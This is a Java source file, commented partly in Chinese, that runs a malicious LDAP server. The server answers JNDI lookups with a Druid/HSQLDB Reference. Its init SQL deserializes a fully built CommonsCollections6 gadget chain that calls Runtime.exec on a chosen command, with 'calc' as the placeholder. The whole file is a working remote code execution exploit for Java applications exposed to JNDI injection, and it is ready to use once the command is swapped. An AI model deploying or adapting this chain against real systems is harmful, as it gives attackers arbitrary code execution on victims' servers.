import com.unboundid.ldap.listener.*;
import com.unboundid.ldap.listener.interceptor.*;
import com.unboundid.ldap.sdk.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.util.HashMap;
import java.util.Map;

public class LdapEvilServer {

    // 端口可改成 50389
    private static final int PORT = 1389;
    // 最短合法 DN：单字符属性 + 自定义值
    private static final String BASE_DN = "dc=example,dc=com";

    public static void main(String[] args) throws Exception {

        InMemoryDirectoryServerConfig cfg =
                new InMemoryDirectoryServerConfig(BASE_DN);   // ① 根后缀

        cfg.setSchema(null);                                  // ② 关闭 schema
        cfg.setListenerConfigs(
                InMemoryListenerConfig.createLDAPConfig(
                        "exploit",
                        InetAddress.getByName("0.0.0.0"),
                        PORT,
                        null)
        );

        // ③ 注册拦截器
        cfg.addInMemoryOperationInterceptor(new ExploitInterceptor());

        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(cfg);
        ds.startListening();
        System.out.println("[+] LDAP listening on 0.0.0.0:" + PORT);
    }

    /** 动态返回 Reference 的拦截器 */
    private static class ExploitInterceptor extends InMemoryOperationInterceptor {

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {

            try {
                String base = result.getRequest().getBaseDN();     // 客户端请求的 DN
                Entry entry = new Entry(base);

                // --- 你的 Druid + HSQL + CC6 payload -----------------
                entry.addAttribute("objectClass", "javaNamingReference");
                entry.addAttribute("javaClassName", "com.alibaba.druid.pool.DruidDataSource");
                entry.addAttribute("javaFactory",  "com.alibaba.druid.pool.DruidDataSourceFactory");

                entry.addAttribute("javaReferenceAddress",
                        ":0:driverClassName:org.hsqldb.jdbcDriver");
                entry.addAttribute("javaReferenceAddress",
                        ":1:url:jdbc:hsqldb:mem:exploitdb;");
                entry.addAttribute("javaReferenceAddress",
                        ":2:initConnectionSqls:" + buildInitSql());
                entry.addAttribute("javaReferenceAddress",
                        ":3:init:true");
                entry.addAttribute("javaReferenceAddress",
                        ":4:initialSize:1");
                // ------------------------------------------------------

                result.sendSearchEntry(entry);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));

                System.out.println("[+] Served exploit for DN: " + base);

            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        /** 拼装 CALL 语句（省略 generateCC6 与 bytesToHex，实现沿用你之前的） */
        private String buildInitSql() throws Exception {
            System.setProperty("org.apache.commons.collections.enableUnsafeSerialization","true");
            byte[] gadget = generateCC6("calc");          // or gnome-calculator
            return "CALL \"java.lang.System.setProperty\"('org.apache.commons.collections.enableUnsafeSerialization','true');"+"CALL \"org.springframework.util.SerializationUtils.deserialize\""
                    + "(X'" + bytesToHex(gadget) + "');";
        }
    }
    /** manually implement CommonsCollections6 payload to avoid early trigger */
    private static byte[] generateCC6(String cmd) throws Exception {
        // CC6 chain: HashMap.readObject() -> TiedMapEntry.hashCode() -> TiedMapEntry.getValue() -> LazyMap.get() -> ChainedTransformer.transform()

        // Create a fake transformer chain that does nothing (for serialization)
        Transformer[] fakeTransformers = new Transformer[] {
                new ConstantTransformer("dummy")
        };
        Transformer fakeTransformerChain = new ChainedTransformer(fakeTransformers);

        // Create LazyMap with fake transformer chain
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, fakeTransformerChain);

        // Create TiedMapEntry with LazyMap
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");

        // Create HashMap and put TiedMapEntry as key
        Map outerMap = new HashMap();
        outerMap.put(tiedMapEntry, "value");

        // Remove the key from LazyMap to avoid triggering during put()
        lazyMap.remove("key");

        // Now use reflection to replace the fake transformer with the real malicious one
        // Create the real transformer chain for command execution
        Transformer[] realTransformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { cmd })
        };
        Transformer realTransformerChain = new ChainedTransformer(realTransformers);

        // Use reflection to replace the fake transformer in LazyMap
        Field factoryField = LazyMap.class.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap, realTransformerChain);

        // Serialize the HashMap
        try (ByteArrayOutputStream bos = new ByteArrayOutputStream();
             java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(bos)) {
            oos.writeObject(outerMap);
            return bos.toByteArray();
        }
    }

    private static String bytesToHex(byte[] data) {
        StringBuilder sb = new StringBuilder(data.length * 2);
        for (byte b : data) sb.append(String.format("%02X", b));
        return sb.toString();
    }
}
